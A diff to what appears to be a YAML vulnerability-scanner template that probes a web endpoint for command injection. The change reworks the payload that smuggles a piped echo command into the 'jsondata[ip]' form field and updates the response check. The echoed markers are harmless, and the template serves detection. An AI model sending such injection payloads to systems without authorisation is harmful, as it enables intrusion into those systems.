@@ -4,6 +4,8 @@ transport: http
 set:
   r1: randomLowercase(10)
   r2: randomLowercase(10)
+  r3: randomLowercase(10)
+  r4: randomLowercase(10)
 rules:
   r1:
     request:
@@ -13,8 +15,8 @@ rules:
       headers:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
       body: |
-        jsondata[ip]=%7C echo {{r1}}%{{r2}}&jsondata[type]=0
-    expression: response.status == 200 && response.body.bcontains(bytes(r1 + "%" + r2))
+        jsondata[ip]=%7C echo {{r1}}${{{r2}}}{{r3}}^{{r4}}&jsondata[type]=0
+    expression: response.status == 200 && (response.body.bcontains(bytes(r1 + r3 + "^" + r4)) || response.body.bcontains(bytes(r1 + "${" + r2 + "}" + r3 + r4)))
 expression: r1()
 detail:
   author: york
